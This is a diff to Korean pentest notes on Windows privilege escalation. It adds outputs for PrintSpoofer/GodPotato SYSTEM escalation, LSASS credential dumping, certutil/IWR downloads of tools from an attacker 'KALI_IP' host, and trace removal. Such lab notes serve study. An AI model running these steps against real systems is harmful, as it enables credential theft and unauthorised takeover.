@@ -4,11 +4,34 @@
 
 - 시나리오 A: 웹쉘(IIS AppPool) → `whoami /priv`에서 SeImpersonatePrivilege 발견
   - `PrintSpoofer64.exe -i -c "whoami"` → SYSTEM 확인
+
+```text
+nt authority\system
+```
+
   - 플래그 수집
+
+```text
+Directory: C:\Windows\System32\Desktop
+-a--- 10/13/2026      34 proof.txt
+```
+
 - 시나리오 B: MSSQL `xp_cmdshell` (mssqlserver 계정) → SeImpersonatePrivilege 발견
   - `GodPotato-NET4.exe -cmd "cmd /c whoami"` → SYSTEM 확인
+
+```text
+nt authority\system
+```
+
 - 시나리오 C: 로컬 관리자 쉘 → SeDebugPrivilege 발견
   - `procdump -ma lsass.exe` → Kali에서 `pypykatz`로 자격 증명 추출
+
+```text
+Dump complete: 1 dump file written.
+== LogonSession ==
+username: Administrator / nthash REDACTED
+```
+
   - 같은 패스워드 재사용 여부 확인 후 측면 이동
 
 # 도구 준비 체크리스트
@@ -26,11 +49,42 @@
 - 설치가 아니다. 타겟에 인스톨러를 돌리는 게 아니라 Kali에서 준비한 단일 exe를 업로드해서 실행만 한다
 - 타겟은 보통 인터넷이 안 되므로 Kali를 http 서버로 열어 전송한다
   - Kali: `python3 -m http.server 8000`
+
+```text
+Serving HTTP on 0.0.0.0 port 8000 ...
+192.168.x.x - - [13/Oct/2026] "GET /PrintSpoofer64.exe HTTP/1.1" 200 -
+```
+
   - 타겟: `certutil -urlcache -split -f http://KALI_IP:8000/PrintSpoofer64.exe C:\temp\ps.exe`
-  - 타겟: `IWR http://KALI_IP:8000/GodPotato-NET4.exe -OutFile C:\temp\gp.exe`
+
+```text
+****  Online  ****
+  0000  ...
+  0f00
+****  Download Complete  ****
+CertUtil: -URLCache command completed successfully.
+```
+
+  - 타겟: `IWR http://KALI_IP:8000/GodPotato-NET4.exe -OutFile C:\temp\gp.exe` (성공 시 출력 없음 → `Get-Item`으로 검증)
+
+```powershell
+Get-Item C:\temp\gp.exe | Select-Object Name, Length
+```
+
+```text
+Name         Length
+----         ------
+gp.exe       300000
+```
+
 - 실행 위치는 쓰기 가능한 임시 폴더만 쓴다
   - `C:\temp`, `C:\Windows\Temp`, `C:\Users\Public`
   - 현재 사용자 Temp 확인: `echo $env:TEMP`
+
+```text
+C:\Users\Administrator\AppData\Local\Temp
+```
+
 - 사용 후 흔적 제거는 기본이다
   - `Remove-Item C:\temp\ps.exe, C:\temp\gp.exe -Force`
 - mimikatz는 타겟에서 직접 돌리지 말고 덤프만 빼온다
@@ -40,3 +94,7 @@
   - LSASS 덤프: `rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump (Get-Process lsass).Id C:\temp\lsass.dmp full`
   - 리버스쉘: `nc.exe` 대신 PowerShell 원라이너 (파일 전송 불필요)
   - SAM/SYSTEM: `reg save`는 윈도우 내장 명령이라 전송 불필요
+
+```text
+The operation completed successfully.
+```
